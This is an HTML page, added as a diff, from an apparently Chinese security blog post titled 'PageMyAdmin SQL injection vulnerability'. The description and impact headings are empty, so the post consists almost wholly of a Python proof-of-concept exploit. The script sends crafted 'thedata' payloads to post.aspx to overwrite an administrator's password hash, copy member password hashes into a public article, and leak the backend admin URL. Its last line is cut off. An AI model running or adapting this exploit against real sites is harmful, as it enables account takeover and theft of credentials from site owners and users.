@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="PageMyAdmin sql注入漏洞一、漏洞简介二、漏洞影响三、复现过程poc#!&#x2F;usr&#x2F;bin&#x2F;env python # -*- coding: utf-8 -*-   import urllib2 import urllib import re import sys  def main():     url&#x3D;sys.argv[1]+&quot;&#x2F;e&#x2F;aspx&#x2F;post.aspx&quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/PageMyAdmin/PageMyAdmin%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="PageMyAdmin sql注入漏洞一、漏洞简介二、漏洞影响三、复现过程poc#!&#x2F;usr&#x2F;bin&#x2F;env python # -*- coding: utf-8 -*-   import urllib2 import urllib import re import sys  def main():     url&#x3D;sys.argv[1]+&quot;&#x2F;e&#x2F;aspx&#x2F;post.aspx&quot;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:00.888Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-PageMyAdmin/PageMyAdmin sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/PageMyAdmin/PageMyAdmin%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.888Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="PageMyAdmin-sql注入漏洞"><a href="#PageMyAdmin-sql注入漏洞" class="headerlink" title="PageMyAdmin sql注入漏洞"></a>PageMyAdmin sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+
+import urllib2
+import urllib
+import re
+import sys
+
+def main():
+    url=sys.argv[1]+&quot;/e/aspx/post.aspx&quot;
+    fun=sys.argv[2]
+    if fun==&#39;upass&#39;:
+        update(url)
+    elif fun==&#39;sqlinject&#39;:
+        sqlinject(url)
+    elif fun==&#39;Backstage&#39;:
+        Backstage(url)
+    else:
+        print&#39;&#39;&#39;
+        usage: pageadminsql.py http://www.baidu.com/ upass
+        parameter: uppass sqlinject Backstage
+        &#39;&#39;&#39;
+def update(url):
+    headers = &#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;,&quot;Referer&quot;:url+&quot;?a=pageadmin_cms&quot;&#125;
+    formate=&#123;
+    &quot;siteid&quot;:&quot;1&quot;,
+    &quot;formtable&quot;:&quot;1&quot;,
+    &quot;thedata&quot;:&#39;[u][k]pa_member[k][s][k]userpassword=&quot;1527f10a11de5efea4b8516213413c103df55126&quot;[k]where[k]id=2&#39;
+    &#125;
+    postdata = urllib.urlencode(formate)
+    request = urllib2.Request(url, data=postdata, headers = headers)
+    try:
+        response = urllib2.urlopen(request)
+        if response.getcode()==200:
+            print u&quot;&gt;&gt;&gt;&gt;&gt;&gt;修改密码成功 修改密码：admin_1234213&lt;&lt;&lt;&lt;&lt;&lt;&quot;
+            pass
+    except Exception as e:
+        print u&quot;&gt;&gt;&gt;&gt;&gt;&gt;修改密码失败&lt;&lt;&lt;&lt;&lt;&lt;&quot;
+        pass
+def sqlinject(url):
+    headers = &#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;,&quot;Referer&quot;:url+&quot;?a=pageadmin_cms&quot;&#125;
+    formate=&#123;
+    &quot;siteid&quot;:&quot;1&quot;,
+    &quot;formtable&quot;:&quot;1&quot;,
+    &quot;thedata&quot;:&quot;[u][k]article,pa_member[k][s][k]article.title=pa_member.userpassword[k]where[k]article.id=747&quot;
+    &#125;
+    postdata = urllib.urlencode(formate)
+    request = urllib2.Request(url, data=postdata, headers = headers)
+    try:
+        response = urllib2.urlopen(request)
+        if response.getcode()==200:
+            print u&quot;&gt;&gt;&gt;&gt;&gt;&gt;密码注入成功 查看密码地址：&#123;0&#125;/index.aspx?lanmuid=63&amp;sublanmuid=654&amp;id=747&lt;&lt;&lt;&lt;&lt;&lt;&quot;.format(sys.argv[1])
+            pass
+    except Exception as e:
+        print u&quot;&gt;&gt;&gt;&gt;&gt;&gt;密码注入失败&lt;&lt;&lt;&lt;&lt;&lt;&quot;
+        pass
+def Backstage(url):
+    headers = &#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;,&quot;Referer&quot;:url+&quot;?a=pageadmin_cms&quot;&#125;
+    formate=&#123;
+    &quot;siteid&quot;:&quot;1&quot;,
+    &quot;formtable&quot;:&quot;1&quot;,
+    &quot;thedata&quot;:&quot;[u][k]article,pa_log[k][s][k]article.title=pa_log.url[k]where[k]article.id=747&quot;
+    &#125;
+    postdata = urllib.urlencode(formate)
+    request = urllib2.Request(url, data=postdata, headers = headers)
+    try:
+        response = urllib2.urlopen(request)
+        if response.getcode()==200:
+            print u&quot;&gt;&gt;&gt;&gt;&gt;&gt;后台地址注入成功 查看后台地址：&#123;0&#125;/index.aspx?lanmuid=63&amp;sublanmuid=654&amp;id=747&lt;&lt;&lt;&lt;&lt;&lt;&quot;.format(sys.argv[1])
+            pass
+    except Exception as e:
+        print u&quot;&gt;&gt;&gt;&gt;&gt;&gt;后台地址注入失败&lt;&lt;&lt;&lt;&lt;&lt;&quot;
+        pass
+if __name__ == &#39;__main__&#39;:
+    main(
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/PageMyAdmin/PageMyAdmin%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qtcs00d0y8v10pcd337m" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/PageMyAdmin/PageMyAdmin%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/OpenSSL/%EF%BC%88CVE-2014-0160%EF%BC%89OpenSSL%20%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
